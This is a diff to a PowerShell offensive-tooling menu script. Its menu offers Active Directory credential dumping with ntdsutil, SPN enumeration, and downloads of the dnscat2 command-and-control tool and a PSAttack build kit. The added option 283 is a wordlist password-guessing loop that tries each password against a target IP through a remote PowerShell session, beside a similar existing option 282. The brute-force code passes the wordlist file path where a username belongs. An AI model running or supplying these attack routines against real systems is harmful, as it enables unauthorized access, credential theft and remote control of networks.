@@ -219,6 +219,7 @@ while($true){
     write-host " 222. Get Users about Service Principal Names (SPN) directory property for an Active Directory service account";
     write-host " 226. dump Active Directory creds with ndtsutil`t`t`t227. Analyze ADS in a file`t`t`t`t`t`t276. compute hash checksum of a file";
     write-host " 282. attack a Domain or IP with username and password wordlist files starting a remote powershell process";
+    write-host " 283. attack an IP and Domain with username and password wordlist files entering in a remote powershell session";
     write-host "WEBDAV";
     write-host " 269. p3nt4/Invoke-TmpDavFS";
     write-host "WINRM";
@@ -471,6 +472,7 @@ while($true){
         '280' {Scarica "lukebaggett/dnscat2-powershell" "dnscat2.ps1" "lukebaggett/dnscat2-powershell/master/dnscat2.ps1"}
         '281' {ScaricaSSL "jaredhaight/PSAttackBuildTool/v1.9.1" "PSAttackBuildTool-v1.9.1.zip" "jaredhaight/PSAttackBuildTool/releases/download/v1.9.1/PSAttackBuildTool-v1.9.1.zip"}
         '282' {$DOMAIN = read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER = read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE = read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){ $PASS = convertto-securestring $TENT -asplaintext -force; $CRED = new-object system.management.automation.pscredential('$DOMAIN\$USER',$PASS); try{start-process powershell -credential $CRED}catch{}}}}}}
+        '283' {$IP = read-host "Digit an IP target"; if($IP -ne ""){$DOMAIN = read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER = read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE = read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){$PW = convertto-securestring -asplaintext -force -string $TENT;	$CRED = new-object -typename system.management.automation.pscredential -argumentlist $DOMAIN\$USER,$PW; enter-pssession -computername $IP -credential $CRED}}}}}}
         default{write-host 'ERROR: this choice is incorrect'}
     }
 }
